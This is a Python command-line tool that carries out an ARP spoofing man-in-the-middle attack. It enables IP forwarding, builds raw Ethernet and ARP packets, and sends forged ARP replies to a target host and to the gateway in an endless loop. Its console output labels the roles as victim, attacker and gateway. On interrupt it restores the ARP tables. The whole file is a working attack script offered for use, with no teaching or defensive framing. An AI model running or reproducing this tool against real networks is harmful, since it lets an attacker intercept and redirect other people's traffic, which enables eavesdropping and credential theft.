#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import struct
import binascii
import time
import argparse
import os
import sys
import re
import subprocess
from subprocess import Popen, PIPE, check_output 


class Spoofing_arp:

      def __init__(self):

           self.arg_parse()
           self.get_geteway()
           self.Host_info()
           self.arpSpoofing()
          
      def get_geteway(self):
           with open ('/proc/net/arp','r') as geteway :
                self.router= geteway.readlines()
           for line in self.router :
               if self.args.Interface in line :
                  self.rou_split = str("".join(line)).replace("\n",'').split()
           self.getaddrss = self.rou_split[0]
           self.getmac = self.rou_split[3]
           route_ipbytes = bytes(self.getaddrss.encode('utf-8'))
           self.geteway_mac = binascii.unhexlify(self.getmac.replace(":",''))
           self.RouterIpConvert = socket.inet_aton(str(route_ipbytes).replace("'","").replace('b',""))            
      def Host_info(self):

           command  = "ifconfig | grep 'ether'"
           Macdb = subprocess.check_output (command,shell=True).decode('utf-8')
           Macaddr = re.compile(r'(?:[0-9a-fA-F]:?){12}')
           FMac = re.findall(Macaddr ,Macdb)
           self.Mac_Interface = str("".join(FMac[0]))
           self.source_mac = binascii.unhexlify(self.Mac_Interface.replace(":",''))
           self.host_name  = socket.gethostname() 
           self.host_ip    = str(check_output(['hostname', '--all-ip-addresses'],stderr=subprocess.PIPE)).\
           replace("b'","").replace("'","").replace("\\n","")
           if  " " in self.host_ip : 
              self.host_ip = self.host_ip.split()
              self.host_ip = str(self.host_ip[0])
           self.HostIpBytes = socket.inet_aton(str(self.host_ip).replace("'","").replace('b',""))    
   
      def arpSpoofing(self):
               
          try:
              os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
              SocketConnect = socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x0806))
              SocketConnect.bind((self.args.Interface,0x0806))                  
              SocketConnect.settimeout(10)
              source_ip  = self.HostIpBytes
              dest_ip    = bytes(self.args.Target.encode('utf-8'))
              source_mac = self.source_mac
              dest_mac   = binascii.unhexlify(self.args.dest.replace(":",''))
              protocol   = 0x0806
              eth_hdr    = struct.pack("!6s6sH",dest_mac,self.source_mac,protocol)
              eth_hdr2    = struct.pack("!6s6sH",self.geteway_mac,self.source_mac,protocol)
              
              # victimmac + attckmac + code
              # gatewaymac +  attckmac + code

              htype      = 1
              ptype      = 0x0800
              hlen       = 6
              plen       = 4 
              opcode_1   = 1
              opcode_2   = 2

              src_ip  = self.HostIpBytes
              des_ip  = socket.inet_aton(str(dest_ip).replace("'","").replace('b',""))

              arp_target = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,self.source_mac,self.RouterIpConvert,dest_mac,des_ip)
              arp_router = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,self.source_mac,des_ip,self.geteway_mac, self.RouterIpConvert)
              #arp_target : htype + protype + hsize + psize + opcode + attckmac + gatewayip + victimmac + victimip
              #arp_router : htype + protype + hsize + psize +opcode + attckmac + victimip + gatewaymac + gatewayip  
              Packet_target = eth_hdr +arp_target 
              Packet_router = eth_hdr2 +arp_router
              time.sleep(1)
              print("\n[*] arp_attack Start...."+"\n"+"*"*20)
              print("[*] arp table has be delete successful")
              time.sleep(2)
              print("[*] New arp table has be created successful")
              time.sleep(1)
              print("[*] IP Forward set to  value 1")
              print('\n'+"*"*22)
              print("[*] Attck Status\n"+'*'*22)
              time.sleep(0.30)
              print("[*] Victam-Ip     -----------------|-> " + self.args.Target)
              time.sleep(0.30)
              print("[*] Victam-Mac    -----------------|-> " + self.args.dest)
              time.sleep(0.30)
              print("[*] Attacker-Ip   -----------------|-> " + self.host_ip)
              time.sleep(0.30)
              print("[*] Attacker-Mac  -----------------|-> " + self.Mac_Interface)
              time.sleep(0.30)
              print("[*] Geteway-Ip    -----------------|-> " + self.getaddrss)
              time.sleep(0.30)
              print("[*] Geteway-Mac   -----------------|-> " + self.getmac )
              time.sleep(0.30)
              print("[*] Interface     -----------------|-> " + self.args.Interface )
              print("*"*40+'\n')
              count = 1 
              print ("[*] Packet Send number >> ",count)
              sys.stdout.write('\x1b[1A')
              sys.stdout.write('\x1b[2K')
              
              while True :
                   print ("[*] Packet Send number >> ",count)
                   sys.stdout.write('\x1b[1A')
                   sys.stdout.write('\x1b[2K')
                   send_packet_to_Target   = SocketConnect.send(Packet_target)    
                   send_packet_to_router   = SocketConnect.send(Packet_router) 
                   
                   if not self.args.repate:
                         time.sleep(2)
                   elif self.args.repate :
                       time.sleep(int(self.args.repate))
                   count +=1
          except Exception as Error :
              print('\n'+"*"*22)
              print("[*] Attck Status\n"+'*'*22)
              time.sleep(0.30)
              print("[*] Error   -----------------|-> " + str(Error))
              exit()
          except KeyboardInterrupt :
                    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                    eth_hdr_Fix   = struct.pack("!6s6sH",dest_mac,self.source_mac,protocol)
                    eth_hdr2_Fix  = struct.pack("!6s6sH",self.geteway_mac,self.source_mac,protocol)
                    arp_target    = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,self.geteway_mac,self.RouterIpConvert,dest_mac,des_ip)
                    arp_router    = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,dest_mac,des_ip,self.geteway_mac,self.RouterIpConvert)
                    Packet_target = eth_hdr_Fix +arp_target 
                    Packet_router = eth_hdr2_Fix +arp_router
                    send_packet_to_Target   = SocketConnect.send(Packet_target)    
                    send_packet_to_router   = SocketConnect.send(Packet_router) 
                    print("\rHosueKeeping Cleanup Process ......")
                    print("*"*40)
                    time.sleep(0.30)
                    print("[*] Total Packet send is ....|- "+ str(count))
                    time.sleep(1)
                    print("[*] IP Forward set to default value 0")
                    time.sleep(1)
                    print("[*] arp Table set to Normal ...")
                    time.sleep(1)
                    counted = 6 
                    for i in range(int(counted)) :
                        counted -=1
                        print("[*] Exit attack Start DownCount >> "+str(counted))
                        time.sleep(1)
                        sys.stdout.write('\x1b[1A')
                        sys.stdout.write('\x1b[2K')
                    print("[*] Exit safe......")
                    time.sleep(1)
                    exit()
      def arg_parse(self):
          parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")          
          parser.add_argument( '-I',"--Interface")
          parser.add_argument( '-M',"--dest"     )  
          parser.add_argument( '-T',"--Target"   )
          parser.add_argument( '-R',"--repate"   )
          parser.add_argument( '-W',"--Wireshark")
          self.args = parser.parse_args()
          if len(sys.argv)> 1 :
              pass
          else:
              parser.print_help()
              exit()  
if __name__=='__main__':
     Spoofing_arp()
